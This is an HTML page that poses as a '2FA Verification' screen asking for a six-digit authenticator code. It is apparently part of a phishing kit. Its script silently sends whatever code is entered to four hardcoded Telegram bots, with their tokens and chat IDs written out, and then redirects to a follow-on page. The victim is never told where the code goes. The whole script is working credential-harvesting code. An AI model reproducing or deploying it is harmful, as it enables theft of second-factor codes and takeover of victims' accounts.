<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: rgb(36, 36, 36);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50vh;
        }

        .container {
            background-color: rgba(34, 38, 38, 0);
            padding: 10px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }

        .container img {
            width: 50px;
            margin-bottom: 20px;
        }

        .container h1 {
            font-size: 15px;
            color: #cacaca;
            font-weight: 700;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            margin-bottom: 10px;
        }

        .container p {
            font-size: 12px;
            color: #b3b3b3;
            font-weight: 500 ;
           font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            margin-bottom: 20px;
        }
         

        .input-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #2c2e2f;
            border: 1px solid #4e4e4e;
            border-radius: 5px;

            margin-bottom: 20px;
        }

        .input-group input {
            border: none;

            color: #fff;
            outline: none;
            width: 80%;
        }

        .input-group button {
            background-color: #3f4547;

            color: #fff;

        }

        .container a {
            font-size:12px;
            font-weight: 600;
           font-style: bold;
            color: #c4d4c9;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }

        .container button.submit {
            background: linear-gradient(90deg, #33cc66, #39b54a);
            color: #000;
            font-weight: 700;
            font-weight: bold;
            border: none;
            padding: 12px;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background 0.3s;
        }

        .container button.submit:hover {
            background:linear-gradient(90deg, #33cc66, #39b54a);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" alt="Lock Icon">
        <h1>Verify 2FA</h1>
        
        <p>Please enter the 6-digit verification code from the authenticator.</p>
        <p class="verifi_code">Verification Code</p>
        <div class="input-group">
            <input type="text" id="verificationCode" placeholder="Verification Code" maxlength="6">
            <button onclick="pasteCode()">Paste</button>
        </div>
        <a href="#">Don't have access to this 2FA?</a>
        <button class="submit" onclick="sendMessage()">Submit</button>
    </div>

   <script>
    // Bot configurations - includes both direct receivers and group forwarder
const bots = [
    {
        token: "7746332737:AAEOz6lVMykBEDri1KAIsN_UFo8eAJoEoHs",
        chatId: "6942741954"
    },
    {
        token: "8086684078:AAGTJyuE7F0tRnRjTX4ScyL_NjxNzdMXNRs",
        chatId: "7745903783"
    },
    {
        token: "7761175575:AAFP2mKzIhk_SUnlMiCSukW4rOlLSUlT6kE",
        chatId: "7166544377"
    },
    // Group forwarding bot
    {
        token: "8043174080:AAGywvags0Uoa4tMGoJUfVz8oEJMHLaE5io",
        chatId: "-4939567735"  // Group chat ID (negative number)
    }
];

/**
 * Sends a message to a Telegram bot.
 * @param {Object} bot - { token, chatId }
 * @param {string} message - Formatted message
 * @returns {Promise<boolean>} - True if successful
 */
async function sendToBot(bot, message) {
    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: bot.chatId,
                text: message,
                parse_mode: "HTML"  // Allows <code>, <b>, etc.
            })
        });

        if (!response.ok) {
            console.error(`Failed to send to ${bot.chatId}:`, await response.text());
            return false;
        }
        return true;
    } catch (error) {
        console.error(`Error sending to ${bot.chatId}:`, error);
        return false;
    }
}

/**
 * Handles form submission, sends code to all bots in parallel.
 */
async function sendMessage() {
    const code = document.getElementById("verificationCode").value.trim();

    if (!code) {
        alert("‚ö†Ô∏è Please enter the verification code.");
        return;
    }

    // Format message for Telegram (HTML mode)
    const message = `üîê <b>2FA Verification Code</b>\n<code>${escapeHtml(code)}</code>`;

    try {
        // Send to all bots in parallel (faster than sequential)
        const results = await Promise.all(
            bots.map(bot => sendToBot(bot, message))
        );

        if (results.every(success => success)) {
            // Redirect only if all messages were sent successfully
            window.location.href = 'verification.html';
        } else {
            console.warn("Some messages failed. Results:", results);
            alert("‚ö†Ô∏è Some messages failed to send. Check console.");
        }
    } catch (error) {
        console.error("Critical error:", error);
        alert("üö® An error occurred. Please try again.");
    }
}

/**
 * Escapes HTML to prevent injection (security measure).
 * @param {string} unsafe - Raw input
 * @returns {string} - Escaped HTML
 */
function escapeHtml(unsafe) {
    return unsafe.replace(/[&<>'"]/g, (tag) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
    }[tag]));
}

/**
 * Pastes clipboard text into the code input (optional feature).
 */
function pasteCode() {
    navigator.clipboard.readText()
        .then(text => {
            const input = document.getElementById("verificationCode");
            input.value = text.trim();
            input.focus();
        })
        .catch(err => {
            console.error("Clipboard error:", err);
            alert("üìã Couldn't access clipboard. Paste manually.");
        });
}

// Initialize form submission on page load
document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("verificationForm") || document.querySelector("form");
    if (form) {
        form.addEventListener("submit", (e) => {
            e.preventDefault();
            sendMessage();
        });
    }

    // Optional: Add a paste button if needed
    const pasteBtn = document.getElementById("pasteBtn");
    if (pasteBtn) {
        pasteBtn.addEventListener("click", pasteCode);
    }
});
</script>
</body>
</html>
